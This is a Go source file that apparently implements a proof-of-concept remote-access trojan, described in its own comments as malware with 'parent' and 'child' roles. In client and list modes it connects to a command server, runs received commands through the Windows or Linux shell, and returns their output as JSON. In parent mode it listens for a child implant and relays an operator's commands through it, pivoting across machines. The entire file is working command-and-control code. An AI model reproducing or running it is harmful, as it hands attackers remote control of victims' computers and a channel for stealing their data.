package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	// "/Blog/POC_Malwarez/arp_connect_main/ARP"
)

var (
	CONNECT string = "127.0.0.1:9999"
)

type Results struct {
	Commands     bool
	CommandsList []string
	ID           int
	//Command string
	Output string
}

// remove ARP
// add Client mode

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func listMode() {
	fmt.Println("###PRINTING TO SCREENONLY in ListMode")
	fmt.Printf("Attempting to connect to %s \n", CONNECT)

	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer c.Close()
	fmt.Println("===Connection successful==")
	fmt.Println("Reading Commands list")

	// if c has no connect, break
	var results string
	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	decoder.Decode(&inputTest)
	checkOS := OSCheck()
	for _, value := range inputTest.CommandsList {
		fmt.Println("Command Received->: " + value)

		commandString := value
		// fmt.Println("CMD received->: ", commandString.Text())

		if checkOS == "windows" {
			// fmt.Println("WINDOWS")
			CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
				// NEED TO FIX UNABLE TO EXECUTE SENDING
			}
			CommandExec2 := string(CommandExec)
			results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))

		} else if checkOS == "linux" {
			// fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
			}
			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
			results = strings.TrimSpace(CommandExec2)
		}
		// fmt.Println(results2)
		// results2 := [...]string{results, "END"}
		//writing
		// fmt.Fprintf(c, results2)

		//using the Results structure
		outputTest := &Results{
			ID:     1, // TODO: need to make this random for multiple children
			Output: results,
		}

		encoder := json.NewEncoder(c)

		encoder.Encode(outputTest)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", outputTest)
		// results2 := jsonMS
		// fmt.Println(jsonMS)
		// c.Write([]byte(encoder))
		//fmt.Fprintf(c, results2)
	}
}

func clientMode() {
	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
	fmt.Printf("Attempting to connect to %s \n", CONNECT)

	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer c.Close()
	fmt.Println("===Connection successful==")
	fmt.Println("Listening for commands")

	for {

		// if c has no connect, break
		var results string
		// commandString, _ = bufio.NewReader(c).ReadString('\n')
		commandString := bufio.NewScanner(c)
		commandString.Scan()
		// need to Decode
		// var inputTest Results
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&inputTest)

		fmt.Println("Command Received->: " + commandString.Text())
		if strings.TrimSpace(commandString.Text()) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())
		checkOS := OSCheck()
		if checkOS == "windows" {
			// fmt.Println("WINDOWS")
			CommandExec, err := exec.Command("cmd", "/C", commandString.Text()).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
				// NEED TO FIX UNABLE TO EXECUTE SENDING
			}
			CommandExec2 := string(CommandExec)
			results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))

		} else if checkOS == "linux" {
			// fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString.Text())).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
			}
			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
			results = strings.TrimSpace(CommandExec2)
		}
		// fmt.Println(results2)
		// results2 := [...]string{results, "END"}
		//writing
		// fmt.Fprintf(c, results2)

		//using the Results structure
		outputTest := &Results{
			ID:     1, // TODO: need to make this random for multiple children
			Output: results,
		}
		// jsonMS, _ := json.Marshal(outputTest)

		encoder := json.NewEncoder(c)

		encoder.Encode(outputTest)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", outputTest)
		// results2 := jsonMS
		// fmt.Println(jsonMS)
		// c.Write([]byte(encoder))
		//fmt.Fprintf(c, results2)

	}

}

func parentMode() {
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
	// this may need to be a go routine
	defer c.Close()
	//======

	fmt.Println("CREATING SERVER FOR CHILD")
	PORT := ":10000"
	l2, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l2.Close()

	//attemping ARP

	//CONNECTION TO CHILD MALWARE

	//server connection for child to connect to.
	//connection on port 10000
	fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else {
		fmt.Println("CHILD connected on", PORT)
	}
	// fmt.Println("server establed on", PORT)

	//server connection for child to connect to.
	//connection on port 10000

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Closing TCP server!")
			return
		}
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}

		// s := string(buf[:len])

		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}
}

// ===========IF NOT ADMIN YOU CANNOT SEND ARP PACKETS =====
func main() {
	// flags declaration using flag package for CLI arguments
	mode := flag.String("mode", "", "mode {client|parent|list}")
	// commands := flag.Bool("commands", false, "Execute a list of commands")

	//parsing flags
	flag.Parse()

	if *mode == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}
	fmt.Printf("mode: %s", *mode)

	if *mode == "client" {
		clientMode()
	} else if *mode == "parent:" {
		parentMode()
	} else if *mode == "list" {
		listMode()
	} else {
		fmt.Println("ERROR")
		os.Exit(1)
	}

}
